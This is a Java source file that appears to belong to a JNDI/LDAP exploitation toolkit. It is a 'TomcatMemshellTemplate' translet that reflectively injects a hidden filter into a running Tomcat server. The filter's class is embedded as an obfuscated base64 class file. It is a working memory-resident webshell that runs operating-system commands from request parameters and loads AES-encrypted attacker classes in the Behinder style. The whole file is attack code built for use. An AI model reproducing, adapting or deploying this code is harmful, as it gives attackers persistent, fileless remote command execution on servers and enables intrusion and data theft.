package com.feihong.ldap.template;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.catalina.webresources.StandardRoot;

import javax.servlet.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Random;

public class TomcatMemshellTemplate1 extends AbstractTranslet {

    //参考
    //https://mp.weixin.qq.com/s/nPAje2-cqdeSzNj4kD2Zgw
    //https://zhuanlan.zhihu.com/p/114625962

    public TomcatMemshellTemplate1(){
        try{
            String str="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            Random random1=new Random();
            //指定字符串长度，拼接字符并toString
            StringBuffer sb=new StringBuffer();
            for (int i = 0; i < 6; i++) {
                //获取指定长度的字符串中任意一个字符的索引值
                int number=random1.nextInt(str.length());
                //根据索引值获取对应的字符
                char charAt = str.charAt(number);
                sb.append(charAt);
            }
            String filterName = sb.toString();
            String urlPattern = "/*";
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();

            StandardRoot standardroot = (StandardRoot) webappClassLoaderBase.getResources();
            if (standardroot==null){
                Field field;
                try {
                    field = webappClassLoaderBase.getClass().getDeclaredField("resources");
                    field.setAccessible(true);
                    System.out.println("sucess");
                }catch (Exception e){
                    field = webappClassLoaderBase.getClass().getSuperclass().getDeclaredField("resources");
                    field.setAccessible(true);
                }
                standardroot = (StandardRoot)field.get(webappClassLoaderBase);
            }

            StandardContext standardContext = (StandardContext) standardroot.getContext();
            Field field;
            try{
                 field = standardContext.getClass().getDeclaredField("filterConfigs");
            }catch (Exception e){
                field = standardContext.getClass().getSuperclass().getDeclaredField("filterConfigs");
            }
            field.setAccessible(true);
            HashMap<String, ApplicationFilterConfig> map = (HashMap<String, ApplicationFilterConfig>) field.get(standardContext);

            if(map.get(filterName) == null) {
                System.out.println("[+] Add Dynamic Filter");

                //生成 FilterDef
                //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
                Class filterDefClass = null;
                try {
                    filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
                } catch (ClassNotFoundException e) {
                    filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
                }

                Object filterDef = filterDefClass.newInstance();
                filterDef.getClass().getDeclaredMethod("setFilterName", String.class).invoke(filterDef, filterName);

                ClassLoader cl = Thread.currentThread().getContextClassLoader();
                Class clazz;
                try{
                    clazz = cl.loadClass("com.feihong.ldap.template.DynamicFilterTemplate");
                }catch(ClassNotFoundException e){

                    String codeClass = "yv66vgAAADIBKgoARACGCACHCQBMAIgIAIkJAEwAigkAiwCMCACNCgCOAI8IAJALAJEAkggAkwoAEACUCgAQAJUJAJYAlwgAmAcAmQgAmggAmwgAYwgAnAcAnQoAngCfCgCeAKAKAKEAogoAFQCjCACkCgAVAKUKABUApgsApwCoCgCpAI8HAKoLAB8AqwsAHwCsCACtBwCuCgAjAIYHAK8LAB8AsAgAZgoAIwCxCABoCABqCwAfALIKALMAtAgAtQgAtgsAtwC4CAC5CgC6ALsHALwKABAAvQoAMgC+CgC6AL8IAMAKADkAwQgAwgcAwwcAcwkAxADFCgA5AMYKAMcAyAcAyQoAPgCGCgA+AMoKALoAywoAzADNCgDMAM4HAM8KAMQA0AoAxwDRCgA5ANIKAEQAlAcA0woASQDUCwDVANYHANcHANgBABBiYXNpY0NtZFNoZWxsUHdkAQASTGphdmEvbGFuZy9TdHJpbmc7AQATYmVoaW5kZXJTaGVsbEhlYWRlcgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAxTGNvbS9mZWlob25nL2xkYXAvdGVtcGxhdGUvRHluYW1pY0ZpbHRlclRlbXBsYXRlOwEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwEACkV4Y2VwdGlvbnMHANkBAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAARjbWRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEABnJlc3VsdAEAA2NtZAEAC3BhZ2VDb250ZXh0AQATTGphdmEvdXRpbC9IYXNoTWFwOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdzZXNzaW9uAQAgTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAAdwYXlsb2FkAQABawEAAWMBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAZtZXRob2QBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEADmV2aWxjbGFzc19ieXRlAQACW0IBAAlldmlsY2xhc3MBABFMamF2YS9sYW5nL0NsYXNzOwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEADVN0YWNrTWFwVGFibGUHAJkHAGEHANMHANoBAAdkZXN0cm95AQAKU291cmNlRmlsZQEAGkR5bmFtaWNGaWx0ZXJUZW1wbGF0ZS5qYXZhDABRAFIBAARoYWNrDABOAE8BAAtVc2VyLUFnZW50dAwAUABPBwDbDADcAN0BAB1bK10gRHluYW1pYyBGaWx0ZXIgc2F5cyBoZWxsbwcA3gwA3wDgAQAEdHlwZQcA4QwA4gDjAQAFYmFzaWMMAOQA5QwA5gDnBwDoDADpAE8BAAEvAQAQamF2YS9sYW5nL1N0cmluZwEABy9iaW4vc2gBAAItYwEAAi9DAQARamF2YS91dGlsL1NjYW5uZXIHAOoMAOsA7AwA7QDuBwDvDADwAPEMAFEA8gEAAlxBDADzAPQMAPUA9gcA9wwA+AD5BwD6AQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAwA+wDjDAD8APYBAARQT1NUAQARamF2YS91dGlsL0hhc2hNYXABACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQwA/QD+DAD/AQAMAQEBAgcBAwwBBAD2AQAQZTQ1ZTMyOWZlYjVkOTI1YgEAAXUHAQUMAQYBBwEAA0FFUwcBCAwBCQEKAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwwBCwEMDABRAQ0MAFgBDgEAFWphdmEubGFuZy5DbGFzc0xvYWRlcgwBDwEQAQALZGVmaW5lQ2xhc3MBAA9qYXZhL2xhbmcvQ2xhc3MHAREMARIAdQwBEwEUBwEVDAEWARcBABZzdW4vbWlzYy9CQVNFNjREZWNvZGVyDAEYARkMARoBGwcBHAwBHQEeDAEfASABABBqYXZhL2xhbmcvT2JqZWN0DAEhASIMASMBJAwBJQEmAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwBJwBSBwEoDABeASkBAC9jb20vZmVpaG9uZy9sZGFwL3RlbXBsYXRlL0R5bmFtaWNGaWx0ZXJUZW1wbGF0ZQEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAB2lzRW1wdHkBAAMoKVoBAAxqYXZhL2lvL0ZpbGUBAAlzZXBhcmF0b3IBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEABG5leHQBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAJZ2V0SGVhZGVyAQAJZ2V0TWV0aG9kAQAKZ2V0U2Vzc2lvbgEAIigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAANwdXQBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACWdldFJlYWRlcgEAGigpTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEACHJlYWRMaW5lAQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAIcHV0VmFsdWUBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQALZ2V0SW5zdGFuY2UBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEACGdldEJ5dGVzAQAEKClbQgEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEAEWphdmEvbGFuZy9JbnRlZ2VyAQAEVFlQRQEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQAMZGVjb2RlQnVmZmVyAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RvRmluYWwBAAYoW0IpW0IBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7AQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAD3ByaW50U3RhY2tUcmFjZQEAGWphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW4BAEAoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWACEATABEAAEATQACAAIATgBPAAAAAgBQAE8AAAAEAAEAUQBSAAEAUwAAAEcAAgABAAAAESq3AAEqEgK1AAMqEgS1AAWxAAAAAgBUAAAAEgAEAAAAFQAEABEACgASABAAFgBVAAAADAABAAAAEQBWAFcAAAABAFgAWQACAFMAAAA1AAAAAgAAAAGxAAAAAgBUAAAABgABAAAAGwBVAAAAFgACAAAAAQBWAFcAAAAAAAEAWgBbAAEAXAAAAAQAAQBdAAEAXgBfAAIAUwAAAzsABgAOAAABuLIABhIHtgAIKxIJuQAKAgDGAJErEgm5AAoCABILtgAMmQCBKyq0AAO5AAoCADoEGQTGAG0ZBLYADZoAZQE6BbIADhIPtgAMmQAbBr0AEFkDEhFTWQQSElNZBRkEUzoFpwAYBr0AEFkDEhNTWQQSFFNZBRkEUzoFuwAVWbgAFhkFtgAXtgAYtwAZEhq2ABu2ABw6Biy5AB0BABkGtgAepwEZK8AAHyq0AAW5ACACAMYBASvAAB+5ACEBABIitgAMmQDjuwAjWbcAJDoEK8AAHzoFLMAAJToGGQW5ACYBADoHGQQSJxkFtgAoVxkEEikZBrYAKFcZBBIqGQe2AChXGQW5ACsBALYALDoIEi06CRkHEi4ZCbkALwMAEjC4ADE6ChkKBbsAMlkZCbYAMxIwtwA0tgA1Eja4ADcSOAa9ADlZAxI6U1kEsgA7U1kFsgA7U7YAPDoLGQsEtgA9GQq7AD5ZtwA/GQi2AEC2AEE6DBkLuABCtgBDBr0ARFkDGQxTWQQDuABFU1kFGQy+uABFU7YARsAAOToNGQ22AEcZBLYASFenABU6BBkEtgBKpwALLSssuQBLAwCxAAEAsQGiAaUASQADAFQAAACOACMAAAAfAAgAIQAjACMALwAkADwAJQA/ACYASgAnAGIAKQB3ACsAkwAsAJ4ALgCxADEAwgAyAMsAMwDRADQA1wA2AOAANwDqADgA9AA5AP4AOwEKAD8BDgBAARkAQQEgAEIBNABDAVUARAFbAEUBbgBGAZcARwGiAEsBpQBJAacASgGsAEsBrwBOAbcAUABVAAAAtgASAD8AXwBgAGEABQCTAAsAYgBPAAYALwBvAGMATwAEAMsA1wBkAGUABADRANEAZgBnAAUA1wDLAGgAaQAGAOAAwgBqAGsABwEKAJgAbABPAAgBDgCUAG0ATwAJASAAggBuAG8ACgFVAE0AcABxAAsBbgA0AHIAcwAMAZcACwB0AHUADQGnAAUAdgB3AAQAAAG4AFYAVwAAAAABuAB4AHkAAQAAAbgAegB7AAIAAAG4AHwAfQADAH4AAAAZAAj9AGIHAH8HAIAU+QAmAvsBAEIHAIEJBwBcAAAABgACAIIAXQABAIMAUgABAFMAAAArAAAAAQAAAAGxAAAAAgBUAAAABgABAAAAVQBVAAAADAABAAAAAQBWAFcAAAABAIQAAAACAIU=";
                    byte[] bytes = base64Decode(codeClass);

                    Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                    method.setAccessible(true);
                    clazz = (Class) method.invoke(cl, bytes, 0, bytes.length);
                }

                filterDef.getClass().getDeclaredMethod("setFilterClass", String.class).invoke(filterDef, clazz.getName());
                filterDef.getClass().getDeclaredMethod("setFilter", Filter.class).invoke(filterDef,clazz.newInstance() );
                try{
                    standardContext.getClass().getDeclaredMethod("addFilterDef", filterDefClass).invoke(standardContext, filterDef);
                }catch (Exception e){
                    standardContext.getClass().getSuperclass().getDeclaredMethod("addFilterDef", filterDefClass).invoke(standardContext, filterDef);
                }

                //设置 FilterMap
                //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
                Class filterMapClass = null;
                try {
                    filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
                } catch (ClassNotFoundException e) {
                    filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                }

                //使用 addFilterMapBefore 会自动把我们创建的 filterMap 丢到第一位去，无需在手动排序了
                //其他中间件应该也是类似的
                Object filterMap = filterMapClass.newInstance();
                filterMap.getClass().getDeclaredMethod("setFilterName", String.class).invoke(filterMap, filterName);
                filterMap.getClass().getDeclaredMethod("setDispatcher", String.class).invoke(filterMap, DispatcherType.REQUEST.name());
                filterMap.getClass().getDeclaredMethod("addURLPattern", String.class).invoke(filterMap, urlPattern);
                try {
                    standardContext.getClass().getDeclaredMethod("addFilterMapBefore", filterMapClass).invoke(standardContext, filterMap);

                }catch (Exception e){
                    standardContext.getClass().getSuperclass().getDeclaredMethod("addFilterMapBefore", filterMapClass).invoke(standardContext, filterMap);

                }

                //设置 FilterConfig
                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, filterDefClass);
                constructor.setAccessible(true);
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
                map.put(filterName, filterConfig);
            }
        }catch(Exception e){
            System.out.println(e.getMessage());
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
    public static byte[] base64Decode(String str) throws Exception{
        byte[] bytes;

        try{
            Class clazz = Class.forName("java.util.Base64");
            Method method = clazz.getDeclaredMethod("getDecoder");
            Object obj = method.invoke(null);
            method = obj.getClass().getDeclaredMethod("decode", String.class);
            obj = method.invoke(obj, str);
            bytes = (byte[]) obj;
        }catch(ClassNotFoundException e){
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            Method method = clazz.getMethod("decodeBuffer", String.class);
            Object obj = method.invoke(clazz.newInstance(), str);
            bytes = (byte[]) obj;
        }

        return bytes;
    }
}
